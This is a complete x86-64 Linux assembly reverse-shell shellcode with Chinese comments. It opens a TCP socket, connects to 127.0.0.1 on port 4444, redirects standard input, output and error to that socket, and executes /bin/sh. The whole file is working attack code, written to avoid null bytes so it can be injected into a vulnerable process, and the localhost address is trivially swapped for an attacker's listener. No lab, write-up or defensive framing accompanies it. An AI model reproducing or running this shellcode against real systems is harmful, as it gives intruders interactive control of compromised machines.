section .text
global _start

_start:
    ; 创建socket
    xor rax, rax
    mov al, 0x29          ; syscall: socket
    xor rdi, rdi          ; domain: AF_INET (2)
    mov dil, 0x2
    xor rsi, rsi          ; type: SOCK_STREAM (1)
    mov sil, 0x1
    xor rdx, rdx          ; protocol: IPPROTO_IP (0)
    syscall

    ; 保存socket文件描述符
    xchg rdi, rax

    ; 连接到服务器
    push rdx
    mov rbx, 0x0100007f   ; IP: 127.0.0.1 (localhost)
    push rbx
    mov rbx, 0x5c110002   ; Port: 4444 (0x5c11), AF_INET (2)
    push rbx
    mov rsi, rsp
    mov al, 0x2a          ; syscall: connect
    mov dl, 0x10          ; sockaddr length
    syscall

    ; 重定向stdin, stdout, stderr到socket
    xor rsi, rsi
    mov al, 0x21          ; syscall: dup2
    syscall
    inc rsi
    mov al, 0x21
    syscall
    inc rsi
    mov al, 0x21
    syscall

    ; 执行/bin/sh
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 0x3b          ; syscall: execve
    syscall
